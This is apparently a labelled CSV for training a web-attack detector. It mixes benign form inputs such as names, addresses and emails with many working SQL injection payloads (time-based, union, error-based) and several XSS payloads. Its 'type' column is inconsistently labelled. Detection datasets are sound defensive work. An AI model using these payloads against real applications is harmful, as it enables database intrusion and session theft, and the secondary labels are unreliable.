Text,attack_type,Label,type
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,normal
-7659') as bowy where 4835=4835 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
31049,norm,0,normal
filpica,norm,0,normal
s4dsudeste,norm,0,normal
benisuera,norm,0,normal
mosegui bofill,norm,0,normal
"-9821) as qqrm where 7152=7152 union all select 7152,7152,7152,7152--",sqli,1,sql
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",sqli,1,normal
1%')));select (case when (6859=6507) then 6859 else 6859*(select 6859 from mysql.db) end)#,sqli,1,sql
rius,norm,0,normal
pico despuig,norm,0,normal
78912457d,norm,0,normal
desconsolar,norm,0,normal
"-6595))) union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",sqli,1,sql
location=?javascript:alert(1)>click,xss,2,xss
-8523) as hzqs where 8944=8944 order by 1--,sqli,1,sql
setabitano,norm,0,normal
1%')));waitfor delay '0:0:5'--,sqli,1,sql
besal,norm,0,normal
entrala,norm,0,normal
anafrodita,norm,0,normal
"exp(~(select * from (select concat(0x7171706a71,(select (elt(1049=1049,1))),0x717a767a71,0x78))x))",sqli,1,sql
1')));select (case when (6969=5797) then 6969 else 6969*(select 6969 from information_schema.character_sets) end)#,sqli,1,sql
71404358f,norm,0,normal
"1'||(select 'tdcr' where 6792=6792 union all select null,null,null,null,null#",sqli,1,sql
id=xss src= <img 6;avascript:alert('xss')>,xss,2,sql
plza. almudaina s/n,norm,0,normal
nela,norm,0,normal
1) rlike sleep(5) and (5724=5724,sqli,1,normal
maas@tobarisch.ke,norm,0,normal
"1%"")));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
caball,norm,0,normal
1%') and 4595=4595#,sqli,1,normal
anbal,norm,0,normal
"-3230"")) as kbxc where 5007=5007 or 2107=8818",sqli,1,normal
1') and (3020=3020)*6703,sqli,1,normal
-8753) order by 1#,sqli,1,normal
1')) as tley where 3539=3539;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
9159,norm,0,normal
"1'))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('qpuy'='qpuy",sqli,1,sql
1%' and sleep(5)#,sqli,1,normal
prdena,norm,0,normal
"1%"")) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""%""=""",sqli,1,sql
(select (case when (4108=4108) then 1 else 4108*(select 4108 from information_schema.character_sets) end)),sqli,1,sql
"1%"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""%""=""",sqli,1,sql
"paseo los gofiones, 62,",norm,0,normal
"1%"") and 8407=(select count(*) from generate_series(1,5000000)) and (""%""=""",sqli,1,sql
26520,norm,0,normal
valencia del mombuey,norm,0,normal
ornella,norm,0,normal
josefa,norm,0,normal
9584356702291868,norm,0,normal
"c/ radio segovia, 27,",norm,0,normal
"1%';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",sqli,1,sql
cassasola nochez,norm,0,normal
dark@ajuntamentbarcelona2-0.fi,norm,0,normal
1'+(select zwsr where 6567=6567;select pg_sleep(5))+',sqli,1,sql
haydock,norm,0,normal
salvina,norm,0,normal
retamal,norm,0,normal
postranecky@francislucille.mm,norm,0,normal
"1) as clye where 7842=7842 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
romaguer,norm,0,normal
10858,norm,0,normal
castrillo de la valduerna,norm,0,normal
8673,norm,0,normal
1%';begin user_lock.sleep(5); end and '%'=',sqli,1,sql
"1%""))) and elt(1210=1210,sleep(5)) and (((""%""=""",sqli,1,normal
"1"" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
zigrand,norm,0,normal
"camino hoya mondongo, 124",norm,0,normal
diocles,norm,0,normal
3006162765919932,norm,0,normal
gorcy.davis@carmensanmartin.bo,norm,0,normal
"1"") where 8462=8462 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
torrecilla del monte,norm,0,normal
mathurin,norm,0,normal
"1')) as qqvk where 1007=1007;select * from generate_series(3379,3379,case when (3379=1219) then 1 else 0 end) limit 1--",sqli,1,sql
cruselles varela,norm,0,normal
ob7491,norm,0,normal
"calle doctor fleming, 7, 7-d",norm,0,normal
1317,norm,0,normal
78360619x,norm,0,normal
kareem,norm,0,normal
anguciana,norm,0,normal
.pateo,norm,0,normal
69,norm,0,normal
"-6431' or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'ixix' like 'ixix",sqli,1,sql
milad,norm,0,normal
8158378459741170,norm,0,normal
"-8153') as qhlb where 4948=4948 union all select 4948,4948,4948,4948,4948,4948#",sqli,1,sql
t4ne0r84oso,norm,0,normal
"1"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1%"") union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1'||(select 'jrbp' from dual where 4129=4129 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,sql
oleilnikov_balasko@hostprofessional.ac,norm,0,normal
equ1tacin,norm,0,normal
-5615') where 5931=5931 or 8450=9229,sqli,1,normal
"1"") as mohv where 2171=2171 or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
"1) where 9469=9469 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1')) as hrra where 9533=9533 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") as ymto where 3453=3453;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"-2549') as zfnf where 1993=1993 union all select 1993,1993,1993,1993,1993,1993--",sqli,1,sql
sixto,norm,0,normal
1'+(select shec where 3589=3589 and 6969=(select 6969 from pg_sleep(5)))+',sqli,1,sql
bernay3@la-sexta-f1.mm,norm,0,normal
"-6186' in boolean mode) union all select 2990,2990,2990#",sqli,1,sql
1'))) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
47209,norm,0,normal
espins marmesat,norm,0,normal
"1"") and make_set(4553=8132,8132) and (""pfci"" like ""pfci",sqli,1,normal
"aldebaran 84,",norm,0,normal
renoir@cocheacoche.fk,norm,0,normal
toledo,norm,0,normal
"1%"" and elt(1210=1210,sleep(5)) and ""%""=""",sqli,1,normal
4a47j69a,norm,0,normal
papageno,norm,0,normal
-2751 where 6334=6334 or (9668=5845)*5845--,sqli,1,sql
17155306c,norm,0,normal
(select (case when (9337=9337) then waitfor delay '0:0:5' else 9337*(select 9337 from master..sysdatabases) end)),sqli,1,sql
aldeanueva de santa cruz,norm,0,normal
1'))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('cbnc' like 'cbnc,sqli,1,sql
botaguea,norm,0,normal
"-8609%""))) union all select 6021,6021,6021,6021,6021,6021--",sqli,1,sql
39379430a,norm,0,normal
calle fermin salvochea 155,norm,0,normal
"1%')) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"</textarea>'""><script>alert(xss)</script>",xss,2,xss
2719,norm,0,normal
vajih,norm,0,normal
"1')) as nuku where 7009=7009 union all select null,null,null,null,null#",sqli,1,sql
5450,norm,0,normal
0r90di89r,norm,0,normal
castilleja de guzmn,norm,0,normal
33527,norm,0,normal
tice,norm,0,normal
"-8109%"")) union all select 9089,9089--",sqli,1,sql
"1' or 8466=benchmark(5000000,md5(0x694a4745)) and 'raru'='raru",sqli,1,normal
geffner-schoo@bacoespecialseleccin.bm,norm,0,normal
"cayetano polo ""polito"" 90 2?a",norm,0,normal
ticona,norm,0,normal
"1"" where 2235=2235 union all select null,null,null,null,null--",sqli,1,sql
1813799559056744,norm,0,normal
70996380a,norm,0,normal
"1"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",sqli,1,sql
bentez monill,norm,0,normal
bada gorina,norm,0,normal
chodos/xodos,norm,0,normal
crosby,norm,0,normal
jamaly,norm,0,normal
hadjiyanev@fortelingenieria.sh,norm,0,normal
50108,norm,0,normal
"1%""))) union all select null,null,null,null#",sqli,1,sql
"1')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('pydi' like 'pydi",sqli,1,sql
1' in boolean mode);waitfor delay '0:0:5'#,sqli,1,sql
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""atlz""=""atlz",sqli,1,sql
12370442f,norm,0,normal
09530,norm,0,normal
"1',(select (case when (3576=7744) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
"1"") where 6018=6018 and 7533=7533--",sqli,1,sql
30802142j,norm,0,normal
liedtke_truhitte@ac-activos.gob,norm,0,normal
"1')) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
1') where 4364=4364 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
70153248m,norm,0,normal
"1) and elt(4249=4249,7259) and (8226=8226",sqli,1,normal
sanchn de la sagrada,norm,0,normal
"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>",xss,2,sql
5561,norm,0,normal
abrucena,norm,0,normal
g0l4,norm,0,normal
"c/ cristu benditu, 112, 12?g",norm,0,normal
"rua bamio, 190 11?h",norm,0,normal
32648,norm,0,normal
3658503055705186,norm,0,normal
"aaiun, 122 12?f",norm,0,normal
"c/ doctor pablos abril 156, 5?f",norm,0,normal
barrera medio,norm,0,normal
1888165017368126,norm,0,normal
pericles,norm,0,normal
lautaro,norm,0,normal
"plaa pau picasso, 88,",norm,0,normal
gottschlich_candy@piaceredelivery.pk,norm,0,normal
"1"")) or elt(6272=6272,sleep(5)) and ((""tvla""=""tvla",sqli,1,normal
46838,norm,0,normal
b4rl942r7,norm,0,normal
backes@kimkardashian.com.lk,norm,0,normal
marty@telogis.mv,norm,0,normal
1%')));select case when 3995=8680 then 1 else null end--,sqli,1,sql
ilday,norm,0,normal
mateos.thatcher@hojainformativas.com.af,norm,0,normal
1') as mzby where 6530=6530;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
walberg@ytv.com.gn,norm,0,normal
08781,norm,0,normal
franklin,norm,0,normal
melquades,norm,0,normal
shiner-rangda@guerrerodelbienestar.cr,norm,0,normal
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (""zsjw"" like ""zsjw",sqli,1,sql
7580,norm,0,normal
pesado stahler,norm,0,normal
2343303470283854,norm,0,normal
ingelber,norm,0,normal
vivie4,norm,0,normal
thuswald,norm,0,normal
83607535m,norm,0,normal
vin,norm,0,normal
"1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (8529=8529",sqli,1,sql
"finca el jardinito, 155,",norm,0,normal
5933500742960791,norm,0,normal
"1%"" union all select null,null--",sqli,1,sql
1 where 9872=9872;select (case when (3863=1151) then 3863 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"<img src=""livescript:document.cookie=true;"">",xss,2,sql
matungo,norm,0,normal
"1) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
49625,norm,0,normal
1'||(select 'xemx' from dual where 4683=4683 or sleep(5)#,sqli,1,sql
"1' where 5702=5702 and elt(3114=3114,sleep(5))#",sqli,1,normal
teodosio,norm,0,normal
4e6qu5r5r,norm,0,normal
nobuo,norm,0,normal
9135,norm,0,normal
"1' or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
81037080f,norm,0,normal
"1%"");(select * from (select(sleep(5)))srmq) and (""%""=""",sqli,1,sql
"1' in boolean mode) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
es,norm,0,normal
robieux,norm,0,normal
"-5830) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
58222899d,norm,0,normal
"1"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""jebr"" like ""jebr",sqli,1,sql
morgan,norm,0,normal
13021468h,norm,0,normal
madona,norm,0,normal
byoungin,norm,0,normal
keely4,norm,0,normal
"-2782')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
baryshnikov@lola-lutscht.es,norm,0,normal
1%') order by 1#,sqli,1,normal
13026737c,norm,0,normal
hatz,norm,0,normal
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('zspf'='zspf",sqli,1,normal
7929689250384395,norm,0,normal
"1)) as juoe where 9994=9994 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
waggenheim@rubirubi.info,norm,0,normal
bili,norm,0,normal
san vicente del raspeig/sant vicent del raspeig,norm,0,normal
derbarn henriquez,norm,0,normal
"-9820"" or 1038=7502#",sqli,1,normal
8702699962501028,norm,0,normal
06894,norm,0,normal
gaja,norm,0,normal
"1'+(select 'drqj' where 1246=1246;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
14880,norm,0,normal
">""<img src=""blah""onmouseover=""document.cookie=true;"">",xss,2,sql
5660834660076309,norm,0,normal
alguese,norm,0,normal
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""buzb""=""buzb",sqli,1,sql
"1 where 7051=7051 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"1%'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('%'='",sqli,1,normal
1)) and 4595=4595#,sqli,1,normal
"1%"") or (select * from (select(sleep(5)))ydpu) and (""%""=""",sqli,1,sql
"1""))) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") where 5698=5698 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
shaughnessy@white-pearl-resort.nf,norm,0,normal
-2303')) as exyt where 2528=2528 or 8571=8571--,sqli,1,sql
6590914640490551,norm,0,normal
abrams.peabody@hojadecalculo.com.py,norm,0,normal
melody0,norm,0,normal
29350,norm,0,normal
"-5420') union all select 2508,2508,2508,2508,2508,2508,2508#",sqli,1,sql
limitable,norm,0,normal
"1%"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",sqli,1,sql
-4184'))) or 2579=4654#,sqli,1,normal
adrie,norm,0,normal
1'))) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
hartling@solmicro-erp.dz,norm,0,normal
1%'))) and 4595=4595#,sqli,1,normal
nazareno,norm,0,normal
kresl,norm,0,normal
carretera 7 hasta km. 4 rueda 5 13f,norm,0,normal
oucharek,norm,0,normal
"1"") and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""zyeo"" like ""zyeo",sqli,1,sql
cabeza novella,norm,0,normal
"1' in boolean mode) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
villafufre,norm,0,normal
"-5062""))) or (1069=8974)*8974 and (((""hsge""=""hsge",sqli,1,normal
68733218h,norm,0,normal
"1') as vpop where 2528=2528 union all select null,null,null,null,null,null,null#",sqli,1,sql
0ocal2za0i3n,norm,0,normal
palmera,norm,0,normal
1'+(select 'rqok' where 5074=5074 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+',sqli,1,sql
xunco s/n,norm,0,normal
02048n3ad1,norm,0,normal
daviu callarisa,norm,0,normal
baldellou,norm,0,normal
49190,norm,0,normal
cosme,norm,0,normal
guillen,norm,0,normal
"-7409"")) union all select 3145,3145,3145--",sqli,1,sql
doreteo,norm,0,normal
"1')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('miba'='miba",sqli,1,sql
"1%';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and '%'='",sqli,1,sql
lores bigas,norm,0,normal
5277668025491077,norm,0,normal
"-5802'))) union all select 6286,6286,6286,6286#",sqli,1,sql
c1lab8,norm,0,normal
celso,norm,0,normal
1090213351051086,norm,0,normal
"1%""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""%""=""",sqli,1,sql
"1 where 6119=6119 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
0589864781053341,norm,0,normal
"1' where 3700=3700 union all select null,null,null--",sqli,1,sql
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)# aetd",sqli,1,sql
eneas,norm,0,normal
zumaran solsona,norm,0,normal
gandolfo,norm,0,normal
"1' where 5547=5547;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
173,norm,0,normal
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('sjxp' like 'sjxp",sqli,1,normal
b6ar1261,norm,0,normal
1') or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
carr97t8,norm,0,normal
arquimbaldo,norm,0,normal
5827164850982375,norm,0,normal
8347221118078165,norm,0,normal
arimany aguila,norm,0,normal
28221877a,norm,0,normal
1734128437321844,norm,0,normal
"1' and elt(4249=4249,7259)",sqli,1,normal
"1)) as berd where 5803=5803 union all select null,null,null,null,null,null,null--",sqli,1,sql
"-9629'))) union all select 3077,3077,3077,3077#",sqli,1,sql
1'||(select 'lmsc' from dual where 1162=1162 order by 1--,sqli,1,sql
75730563g,norm,0,normal
aldhizer,norm,0,normal
"1)) as zmsa where 6909=6909 union all select null,null,null,null,null,null,null#",sqli,1,sql
6894,norm,0,normal
5032561795933103,norm,0,normal
guillory,norm,0,normal
"1"") where 1416=1416 union all select null,null,null#",sqli,1,sql
<body/onhashchange=alert(1)><a+href=#>clickit,xss,2,normal
hatajo,norm,0,normal
"-1<style type=""text/javascript"">document.cookie=true;</style>",xss,2,sql
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
chassigneux.tekurarere3@truecatucasa.gg,norm,0,normal
46208410f,norm,0,normal
ta-sung,norm,0,normal
85089975a,norm,0,normal
02340,norm,0,normal
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""cwpt"" like ""cwpt",sqli,1,sql
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",sqli,1,sql
"plza. santa marina, s/n, 12?h",norm,0,normal
7361,norm,0,normal
"1%"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""%""=""",sqli,1,sql
7081,norm,0,normal
7246,norm,0,normal
91918460h,norm,0,normal
bl!teo,norm,0,normal
2591,norm,0,normal
coca artero,norm,0,normal
06673981w,norm,0,normal
eventual,norm,0,normal
enaciado,norm,0,normal
rosendal,norm,0,normal
vopalens,norm,0,normal
"1'||(select 'djoe' from dual where 8063=8063 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))))||'",sqli,1,sql
1 where 8102=8102 and 9198=9198--,sqli,1,sql
"1%')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='",sqli,1,sql
-2022))) or 6812=3516 and (((3896=3896,sqli,1,normal
godoy fradera,norm,0,normal
9782,norm,0,normal
1)) or sleep(5)#,sqli,1,normal
"-3059 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
velichcanich pairot,norm,0,normal
"plaza cruz caamelar s/n,",norm,0,normal
fennell,norm,0,normal
"1))) union all select null,null,null,null,null,null--",sqli,1,sql
"1%' and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
ellery,norm,0,normal
"-8725""))) or (8459=8459)*4906 and (((""vblw"" like ""vblw",sqli,1,normal
03837,norm,0,normal
06700,norm,0,normal
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ""uqor"" like ""uqor",sqli,1,sql
7823647161649083,norm,0,normal
marino,norm,0,normal
1'||(select 'hkvl' from dual where 8882=8882;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"calle igualada, 143,",norm,0,normal
"1"";begin user_lock.sleep(5); end and ""unqj""=""unqj",sqli,1,sql
1825754636635369,norm,0,normal
san juan del monte,norm,0,normal
"1'))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
enjabonadura,norm,0,normal
g3a254,norm,0,normal
"1"")));select (case when (4059=7807) then 4059 else 1/(select 0) end)--",sqli,1,sql
"1'+(select 'qaar' where 7841=7841 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1,sql
mendiz espn,norm,0,normal
"1')) or elt(6272=6272,sleep(5)) and (('zjel' like 'zjel",sqli,1,normal
37871926b,norm,0,normal
monitor,norm,0,normal
1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
"1%"" and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",sqli,1,sql
4s3as4ra,norm,0,normal
deshonra,norm,0,normal
yunn-tzu,norm,0,normal
"1"")) as puws where 7006=7006;select (case when (7997=1543) then 7997 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
"1%'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('%'='",sqli,1,sql
fisico,norm,0,normal
"1'+(select mkbv where 1648=1648 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
vaillant altimir,norm,0,normal
"1%"" or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""",sqli,1,sql
napolen,norm,0,normal
"<video><source onerror=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">",xss,2,xss
rescisorio,norm,0,normal
arnal martagn,norm,0,normal
"1"" where 2394=2394 and 8831=8333--",sqli,1,sql
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1,sql
erasio,norm,0,normal
43827245d,norm,0,normal
descerrajado,norm,0,normal
"pontenova, a",norm,0,normal
12427,norm,0,normal
brihuega,norm,0,normal
"-1123'))) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",sqli,1,sql
ojizarca,norm,0,normal
stefana1,norm,0,normal
48530,norm,0,normal
schweiger_blanc@restaurantepicopico.rw,norm,0,normal
583no,norm,0,normal
"1%' or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and '%'='",sqli,1,sql
"-1<body onload=""document.cookie=true;"">",xss,2,xss
henrikson@hojainformativas.int,norm,0,normal
"1' where 4150=4150 and elt(8012=6026,6026)--",sqli,1,sql
pal,norm,0,normal
hightower@freetag.cl,norm,0,normal
63897551d,norm,0,normal
"calle pago de la serrana 109, 11?a",norm,0,normal
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('cuat'='cuat",sqli,1,sql
"1"")) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1'));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
49160,norm,0,normal
1') as gxfu where 9676=9676;select case when 5894=4052 then 1 else null end--,sqli,1,sql
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('clhg'='clhg",sqli,1,sql
pankiw,norm,0,normal
8833519281549056,norm,0,normal
35500,norm,0,normal
cabezn de pisuerga,norm,0,normal
sofiana,norm,0,normal
52310665v,norm,0,normal
pastores,norm,0,normal
-6637')) order by 1#,sqli,1,normal
rodionova@movil-google.ga,norm,0,normal
8773448102181784,norm,0,normal
"1%"" or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
lahuen,norm,0,normal
43273596q,norm,0,normal
mlida,norm,0,normal
"plaza alfonso el batallador, 117,",norm,0,normal
